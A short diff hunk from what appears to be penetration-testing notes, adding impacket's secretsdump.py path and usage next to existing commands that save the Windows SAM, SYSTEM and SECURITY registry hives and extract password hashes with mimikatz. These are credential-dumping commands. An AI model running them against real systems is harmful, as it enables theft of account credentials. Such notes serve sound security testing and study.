@@ -84,7 +84,9 @@ reg save HKLM\SYSTEM sys.h  #to Dump SYSTEM
 reg save HKLM\SECURITY sec.h  #to Dump SECURITY  
 mimikatz # lsadump::sam sys.h sam.h sec.h  #get hashes from these files with mimikatz  
 
-  
+#secretsdump.py from impacket could also be used
+/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py  # kali location
+python3 secretsdump.py LOCAL -system system.h -sam sam.h -security sec.h
   
   
   
